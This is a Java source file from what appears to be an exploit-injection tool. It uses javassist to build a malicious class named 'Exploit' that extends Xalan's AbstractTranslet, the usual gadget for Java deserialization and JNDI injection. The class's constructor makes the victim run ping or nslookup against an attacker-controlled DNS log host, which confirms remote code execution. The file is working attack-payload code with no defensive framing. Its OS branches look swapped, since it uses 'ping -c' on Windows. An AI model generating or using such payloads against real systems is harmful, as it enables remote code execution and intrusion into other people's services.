package net.roboterh.injector.templates;

import javassist.*;
import net.roboterh.injector.utils.Cache;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

public class DnsLogTemplate implements Template{
    private Logger logger = LogManager.getLogger(DnsLogTemplate.class);

    private String dnsLog;
    private String className;
    private byte[] bytes;

    public DnsLogTemplate(String dnsLog) {
        this.dnsLog = dnsLog;
        // set normal className
        this.className = "Exploit" + PayloadUtils.getRandomString();

        generate();
    }

    public DnsLogTemplate(String dnsLog, String className) {
        this.dnsLog = dnsLog;
        this.className = className;

        generate();
    }

    public String getClassName() {
        return className;
    }

    public void addCache() {
        Cache.set(className, bytes);
    }

    public void generate() {
        // generate bytecode using javassist
        try {
            // build ClassPool Object
            ClassPool pool = ClassPool.getDefault();

            CtClass ctClass = pool.makeClass(className);

            // add the super class
            ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
            // add constructor
            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
            ctConstructor.setBody("try {" +
                    "String os = System.getProperty(\"os.name\");" +
                    "if (os.toLowerCase().contains(\"win\")) {" +
                    "java.lang.Runtime.getRuntime().exec(\"ping -c 1 " + dnsLog + "\");" +
                    "} else {" +
                    "java.lang.Runtime.getRuntime().exec(\"nslookup " + dnsLog + "\");" +
                    "}" +
                    "} catch (java.lang.Exception e) {" +
                    "}");
            ctClass.addConstructor(ctConstructor);

            // generate bytes
            bytes = ctClass.toBytecode();
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public byte[] getBytes() {
        return bytes;
    }
}
